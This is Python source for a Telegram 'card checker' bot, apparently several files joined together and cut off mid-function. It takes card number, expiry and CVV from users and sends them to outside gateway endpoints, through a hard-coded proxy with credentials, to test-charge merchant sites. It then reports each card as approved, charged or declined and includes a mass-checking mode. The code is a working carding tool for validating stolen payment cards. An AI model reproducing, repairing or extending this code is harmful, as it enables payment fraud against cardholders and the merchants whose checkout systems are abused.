    bullet_text = "\[⌇\]"   # Escaped so [] stay visible in MarkdownV2
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    credits = str(user_data.get('credits', 0))
    plan = user_data.get('plan', 'N/A')

    # Escape user inputs
    username = f"@{user.username}" if user.username else "N/A"
    escaped_username = escape_markdown_v2(username)
    escaped_user_id = escape_markdown_v2(str(user.id))
    escaped_plan = escape_markdown_v2(plan)
    escaped_credits = escape_markdown_v2(credits)

    credit_message = (
        f"💳 *Your Credit Info* 💳\n"
        f"✦━━━━━━━━━━━━━━✦\n"
        f"{bullet_link} Username: {escaped_username}\n"
        f"{bullet_link} User ID: `{escaped_user_id}`\n"
        f"{bullet_link} Plan: `{escaped_plan}`\n"
        f"{bullet_link} Credits: `{escaped_credits}`\n"
    )

    await update.effective_message.reply_text(
        credit_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )






import time
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
from bin import get_bin_info   # ✅ use the correct function
import re
import logging

# Import your database functions here
from db import get_user, update_user

logger = logging.getLogger(__name__)

# Global variable for user cooldowns
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 3) -> bool:
    """Enforces a cooldown period for a user to prevent spamming."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


# ===== BACKGROUND CHECK =====
import aiohttp
import re
from telegram.constants import ParseMode

# --- Safe escape for MarkdownV2 ---
def escape_md(text: object) -> str:
    """Escape text for MarkdownV2. Always coerce to str so None won't break re.sub."""
    s = "" if text is None else str(text)
    return re.sub(r'([_\*\[\]\(\)\~\>\#\+\-\=\|\{\}\.\!\\`])', r'\\\1', s)


import aiohttp
import html
from telegram.constants import ParseMode

async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    import time
    start_time = time.time()

    try:
        # BIN lookup
        bin_number = parts[0][:6]
        bin_details = await get_bin_info(bin_number) or {}

        # Safely extract values
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = (
            bin_details.get("bank", "N/A")["name"]
            if isinstance(bin_details.get("bank"), dict)
            else bin_details.get("bank") or "N/A"
        )
        country_name = (
            bin_details.get("country", "N/A")["name"]
            if isinstance(bin_details.get("country"), dict)
            else bin_details.get("country") or "N/A"
        )
        country_flag = bin_details.get("country_emoji") or ""
        card_type = bin_details.get("type") or "N/A"
        card_level = bin_details.get("brand") or "N/A"

        # Call main API
        api_url = (
            "https://stripe.stormx.pw/"
            f"gateway=autostripe/key=darkboy/site=shebrews.org/cc={cc_normalized}"
        )
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=55) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        # Extract status + response
        api_status = (data.get("status") or "Unknown").strip()
        api_response = (data.get("response") or "No response").strip()

        # Status formatting with emoji
        lower_status = api_status.lower()
        if "approved" in lower_status:
            status_text = "✅ APPROVED"
        elif "declined" in lower_status:
            status_text = "❌ DECLINED"
        elif "ccn live" in lower_status:
            status_text = "❎ CCN LIVE"
        elif "incorrect" in lower_status or "your number" in lower_status:
            status_text = "⚠️ INCORRECT"
        elif "3ds" in lower_status or "auth required" in lower_status:
            status_text = "🔒 3DS REQUIRED"
        elif "insufficient funds" in lower_status:
            status_text = "💸 INSUFFICIENT FUNDS"
        elif "expired" in lower_status:
            status_text = "⌛ EXPIRED"
        elif "stolen" in lower_status:
            status_text = "🚫 STOLEN CARD"
        elif "pickup card" in lower_status:
            status_text = "🛑 PICKUP CARD"
        elif "fraudulent" in lower_status:
            status_text = "⚠️ FRAUD CARD"
        else:
            status_text = f"ℹ️ {api_status.upper()}"

        # Handle missing first_name
        user_first = getattr(user, "first_name", None) or "User"

        # Time taken
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        # Final text formatted for Telegram HTML
        final_text = (
            f"<b><i>{status_text}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝  \n"
            f"⤷ <code>{html.escape(cc_normalized)}</code>\n"            
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <b><code>{html.escape(api_response)}</code></b>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {html.escape(country_flag)}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ <a href=\"tg://resolve?domain=Kalinuxxx\">kคli liຖนxx</a>\n"                   
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"     
        )

        # Send final message
        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ An error occurred: <code>{html.escape(str(e))}</code>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

import re
import asyncio
import html
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible pattern: separators can be |, /, :, or spaces
CARD_PATTERN = re.compile(
    r"\b(\d{13,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.", parse_mode=ParseMode.HTML)
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # 1️⃣ Command argument
    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    # 2️⃣ Reply to message
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # No card input
    if not card_input:
        usage_text = (
            "🚫 <b>Usage:</b> /chk card|mm|yy|cvv\n"
            "Or reply to a message containing a card."
        )
        await update.effective_message.reply_text(usage_text, parse_mode=ParseMode.HTML)
        return

    # Normalize
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"

    # Deduct credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text("❌ No credits left.", parse_mode=ParseMode.HTML)
        return

    # Processing message
    processing_text = (
        "<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{html.escape(cc_normalized)}</code></pre>\n"
        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ #𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Background check
    asyncio.create_task(
        background_check(cc_normalized, [card, mm, yy, cvv], user, user_data, status_msg)
    )





import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import asyncio
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process /pp command: call PayPal gateway API and format the reply.
    Gateway label = PayPal, Price = 1$
    """
    start_time = time.time()
    try:
        user = update.effective_user

        # consume credit
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # initial processing message
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escape(payload)}</code></pre>\n\n"
            f"<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐏𝐚𝐲𝐏𝐚𝐥 1$</b>\n"
        )
        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # build API URL
        api_url = f"https://payalalwaysforme.onrender.com/api?gateway=paypal1&key=payalismy&cc={payload}"

        # call API
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response_text = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # parse API JSON
        try:
            data = json.loads(api_response_text)
        except json.JSONDecodeError:
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response_text[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # API returns both message + response_text
        message = data.get("message", "Unknown")  # already includes emoji
        response_text = data.get("response_text", "")

        # clean response_text (strip "ERROR: ...")
        cleaned_response = response_text
        if isinstance(response_text, str) and ":" in response_text:
            cleaned_response = response_text.split(":", 1)[1].strip()

        # BIN lookup
        try:
            bin_number = payload.split("|")[0][:6]
            bin_details = await get_bin_info(bin_number) or {}
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank", {}).get("name") if isinstance(bin_details.get("bank"), dict) else bin_details.get("bank", "N/A")
            country_name = bin_details.get("country", {}).get("name") if isinstance(bin_details.get("country"), dict) else bin_details.get("country", "Unknown")
            country_flag = bin_details.get("country_emoji", "")
        except Exception:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # developer branding
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # elapsed time
        elapsed_time = round(time.time() - start_time, 2)

        # final message: show API's `message` as-is (with emoji at front), response as cleaned
        final_msg = (
            f"<b><i>{escape(message)}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escape(payload)}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙥𝙖𝙡 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(cleaned_response)}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass




# --- Main /pp command ---
import re
import asyncio
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes

# Flexible regex: allows |, /, :, or spaces as separators
PP_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = PP_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = PP_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/pp card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_pp(update, context, payload))




import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import asyncio
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /st command: check Stripe charge, display response and BIN info.
    Gateway label = Stripe, Price = 1$
    """
    import time
    start_time = time.time()

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /st 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escape(full_card)}</code></pre>\n\n"
            f"<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐒𝐭𝐫𝗶𝗽𝗲 1$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"https://rockyog.onrender.com/index.php"
            f"?site=https://jovs.com"
            f"&cc={full_card}"
            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Stripe")
        price = data.get("Price", "1$")

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number) or {}
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank", {}).get("name") if isinstance(bin_details.get("bank"), dict) else bin_details.get("bank", "N/A")
            country_name = bin_details.get("country", {}).get("name") if isinstance(bin_details.get("country"), dict) else bin_details.get("country", "Unknown")
            country_flag = bin_details.get("country_emoji", "")
        except Exception:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'

        # --- Developer Branding ---
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header/status ---
        display_response = escape(response)
        lower_resp = response.lower()
        if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            header_status = "✅ Approved"
        elif "INCORRECT_CVC" in response.upper():
            header_status = "✅ Approved"
        elif "INCORRECT_ZIP" in response.upper():
            header_status = "✅ Approved"            
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ DECLINED"
        else:
            header_status = "❌ DECLINED"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_msg = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escape(full_card)}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass




# --- Main /sh command ---
import re
import asyncio
import html
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes

# Flexible regex: allows |, /, :, or spaces as separators
ST_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = ST_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = ST_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/st card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_st(update, context, payload))




import asyncio
import aiohttp
import time
import re
import logging
from telegram import Update
from telegram.ext import ContextTypes
from telegram.error import TelegramError, BadRequest
from db import get_user, update_user

# --- SETTINGS ---
API_URL_TEMPLATE = (
    "https://stripe.stormx.pw/"
    "gateway=autostripe/key=darkboy/site=shebrews.org/cc="
)
CONCURRENCY = 3
RATE_LIMIT_SECONDS = 5
user_last_command_time = {}
BULLET_GROUP_LINK = "https://t.me/CARDER33"

# --- CREDIT HANDLER ---
async def deduct_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logging.error(f"[deduct_credit] Error for user {user_id}: {e}")
    return False

# --- HELPERS ---
def extract_cards(text: str) -> list[str]:
    return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)

def mdv2_escape(text: str) -> str:
    """Escape text for Telegram MarkdownV2 safely."""
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape_chars else c for c in str(text))

def format_user_link(user) -> str:
    """Return a clickable Telegram user link using their name."""
    name = user.first_name
    if user.last_name:
        name += f" {user.last_name}"
    return f"[{mdv2_escape(name)}](tg://user?id={user.id})"

# --- SINGLE CARD CHECK ---
async def check_single_card(session, card: str):
    try:
        async with session.get(API_URL_TEMPLATE + card, timeout=40) as resp:
            data = await resp.json()

        status = str(data.get("status") or data.get("Status") or "unknown").strip().lower()
        response = str(data.get("response") or data.get("Response") or "No response").strip()

        card_md = mdv2_escape(card)
        response_md = mdv2_escape(response)

        if "approved" in status:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ✅ _{response_md}_", "approved"
        elif "declined" in status:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _{response_md}_", "declined"
        else:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ⚠️ _{response_md}_", "error"

    except (aiohttp.ClientError, asyncio.TimeoutError):
        return f"`{mdv2_escape(card)}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _Network Error_", "error"
    except Exception as e:
        return f"`{mdv2_escape(card)}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _{mdv2_escape(str(e))}_", "error"

# --- MASS CHECK CORE ---
import asyncio
import time
import logging
import aiohttp
from telegram import Update
from telegram.error import BadRequest, TelegramError
from telegram.ext import ContextTypes

# --- Helper Functions ---
def mdv2_escape(text: str) -> str:
    """
    Escape all MarkdownV2 special characters.
    """
    escape_chars = r"\_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape_chars else c for c in text)

def format_user_link(user) -> str:
    """
    Return a clickable user link with the escaped full name.
    """
    name = mdv2_escape(user.full_name)
    return f"[{name}](tg://user?id={user.id})"

def extract_cards(text: str):
    """
    Extract card strings from a message.
    """
    # Example: simple split by lines
    return [line.strip() for line in text.splitlines() if line.strip()]

# --- RUN MASS CHECKER ---
async def run_mass_checker(msg_obj, cards, user):
    total = len(cards)
    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
    results = []
    start_time = time.time()

    bullet = "[⌇]"
    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
    requester_text = f"Requested By ➵ {format_user_link(user)}"
    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")

    # --- Initial Processing Message ---
    initial_text = (
        f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
        f"{bullet_link} {gateway_text}\n"
        f"{bullet_link} {status_text}"
    )

    try:
        msg_obj = await msg_obj.reply_text(
            initial_text,
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
    except BadRequest as e:
        logging.error(f"[editMessageText-init] {e.message}")
        return

    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(CONCURRENCY)

    async with aiohttp.ClientSession() as session:
        async def worker(card):
            async with semaphore:
                result_text, status = await check_single_card(session, card)
                counters["checked"] += 1
                counters[status] += 1
                await queue.put(result_text)

        tasks = [asyncio.create_task(worker(c)) for c in cards]

        async def consumer():
            nonlocal results
            while True:
                try:
                    result = await asyncio.wait_for(queue.get(), timeout=2)
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
                    continue

                results.append(result)
                elapsed = round(time.time() - start_time, 2)

                header = (
                    f"{bullet_link} {gateway_text}\n"
                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {mdv2_escape(str(counters['checked']))}/{mdv2_escape(str(total))}\n"
                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {mdv2_escape(str(counters['approved']))}\n"
                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {mdv2_escape(str(counters['declined']))}\n"
                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {mdv2_escape(str(counters['error']))}\n"
                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {mdv2_escape(str(elapsed))} Sec\n"
                    "──────── ⸙ ─────────"
                )
                content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results)

                try:
                    await msg_obj.edit_text(
                        content,
                        parse_mode="MarkdownV2",
                        disable_web_page_preview=True
                    )
                except (BadRequest, TelegramError) as e:
                    logging.error(f"[editMessageText-update] {e}")

                await asyncio.sleep(0.3)

        await asyncio.gather(*tasks, consumer())

# --- MASS HANDLER ---
import asyncio
import time
import logging
import aiohttp
from telegram import Update
from telegram.error import BadRequest, TelegramError
from telegram.ext import ContextTypes

# --- Helper Functions ---
def mdv2_escape(text: str) -> str:
    """
    Escape all MarkdownV2 special characters.
    """
    escape_chars = r"\_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape_chars else c for c in text)

def extract_cards(text: str):
    """
    Extract card strings from a message.
    """
    return [line.strip() for line in text.splitlines() if line.strip()]

# --- RUN MASS CHECKER ---
async def run_mass_checker(msg_obj, cards, user):
    total = len(cards)
    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
    results = []
    start_time = time.time()

    bullet = "[⌇]"
    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"

    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(CONCURRENCY)

    async with aiohttp.ClientSession() as session:
        async def worker(card):
            async with semaphore:
                result_text, status = await check_single_card(session, card)
                counters["checked"] += 1
                counters[status] += 1
                await queue.put(result_text)

        tasks = [asyncio.create_task(worker(c)) for c in cards]

        async def consumer():
            nonlocal results
            while True:
                try:
                    result = await asyncio.wait_for(queue.get(), timeout=2)
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
                    continue

                results.append(result)
                elapsed = round(time.time() - start_time, 2)

                header = (
                    f"{bullet_link} {mdv2_escape('𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵')}\n"
                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {mdv2_escape(str(counters['checked']))}/{mdv2_escape(str(total))}\n"
                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {mdv2_escape(str(counters['approved']))}\n"
